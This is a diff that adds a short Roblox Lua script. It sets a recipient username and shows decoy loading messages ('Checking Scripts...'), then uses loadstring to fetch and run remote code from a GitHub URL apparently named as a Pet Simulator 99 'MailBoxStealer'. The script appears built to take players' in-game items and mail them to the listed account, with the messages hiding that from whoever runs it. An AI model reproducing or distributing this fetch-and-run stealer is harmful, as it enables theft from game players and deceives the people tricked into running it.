@@ -1,0 +1,8 @@
+Username = "4813998041"
+_G.CustomScriptName = "BLACK SCRIPT" -- Main text
+_G.Text1 = "Script Loaded..." --tip test1
+_G.Text2 = "Waiting for Script" --tip test1
+_G.Text3 = "Checking Scripts..." --tip test1
+_G.Text4 = "Starting Scripts..." --tip test1
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kdm063/PetSim99/main/MailBoxStealerV3"))()
